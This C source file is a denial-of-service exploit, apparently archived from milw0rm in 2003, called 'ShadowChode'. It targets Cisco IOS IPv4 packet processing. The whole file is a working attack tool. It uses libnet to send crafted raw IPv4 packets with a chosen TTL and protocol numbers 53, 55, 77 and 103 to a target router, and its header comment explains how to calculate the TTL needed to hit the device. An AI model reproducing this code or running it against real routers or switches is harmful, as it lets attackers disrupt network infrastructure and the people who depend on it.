/*
* ShadowChode - Cisco IOS IPv4 Packet Processing Denial of Service Exploit
*
* Ping target router/switch for TTL to host. Subtract that number from 255
* and use that TTL on the command line. The TTL must equal 0 or 1 when it
* reaches the target. The target must accept packets to the given target
* interface address and there are some other caveats.
*
* BROUGHT TO YOU BY THE LETTERS C AND D
*
* [L0cK]
*/

#include <stdio.h>
#include <sys/types.h>

#include "libnet.h"

#define MIN_PAYLOAD_LEN (26)

#define CLEANUP { \
libnet_destroy(lh); \
free(payload); \
}

int
main(int argc, char *argv[])
{
char errbuf[LIBNET_ERRBUF_SIZE];
libnet_t *lh;
u_long dst_addr;
int ttl;
int payload_len;
char *payload;
libnet_ptag_t data_tag;
libnet_ptag_t ip_tag;
int i;
int len;
int protocols[] = { 53, 55, 77, 103 };
struct libnet_stats ls;

lh = libnet_init(LIBNET_RAW4, NULL, errbuf);

if (lh == NULL) {
(void) fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
exit(-1);
}

if (argc != 3 || (dst_addr = libnet_name2addr4(lh, argv[1], LIBNET_RESOLVE) == -1)) {
(void) fprintf(stderr, "Usage: %s <target> <ttl>\n", argv[0]);
libnet_destroy(lh);
exit(-1);
}

{ /* OH WAIT, ROUTE'S RESOLVER DOESN'T WORK! */
struct in_addr dst;

if (!inet_aton(argv[1], &dst)) {
perror("inet_aton");
libnet_destroy(lh);
exit(-1);
}

dst_addr = dst.s_addr;
}

ttl = atoi(argv[2]);

libnet_seed_prand(lh);

len = libnet_get_prand(LIBNET_PR8);

/* Mmmmm, suck up random amount of memory! */

payload_len = (MIN_PAYLOAD_LEN > len) ? MIN_PAYLOAD_LEN : len;

payload = (char *) malloc(payload_len);

if (payload == NULL) {
perror("malloc");
libnet_destroy(lh);
exit(-1);
}

for (i = 0; i < payload_len; i++) {
payload[i] = i;
}

data_tag = LIBNET_PTAG_INITIALIZER;

data_tag = libnet_build_data(payload, payload_len, lh, data_tag);

if (data_tag == -1) {
(void) fprintf(stderr, "Can't build data block: %s\n", libnet_geterror(lh));
CLEANUP;
exit(-1);
}

ip_tag = LIBNET_PTAG_INITIALIZER;

for (i = 0; i < 4; i++) {
ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + payload_len, 0, libnet_get_prand(LIBNET_PRu16),
 0, ttl, protocols[i], 0, libnet_get_prand(LIBNET_PRu32), dst_addr, NULL, 0, lh, ip_tag);

if (ip_tag == -1) {
(void) fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(lh));
CLEANUP;
exit(-1);
}

len = libnet_write(lh);

if (len == -1) {
(void) fprintf(stderr, "Write error: %s\n", libnet_geterror(lh));
}
}

libnet_stats(lh, &ls);

(void) fprintf(stderr, "Packets sent: %ld\n"
"Packet errors: %ld\n"
"Bytes written: %ld\n",
ls.packets_sent, ls.packet_errors, ls.bytes_written);

CLEANUP;

return (0);
}

// milw0rm.com [2003-07-18]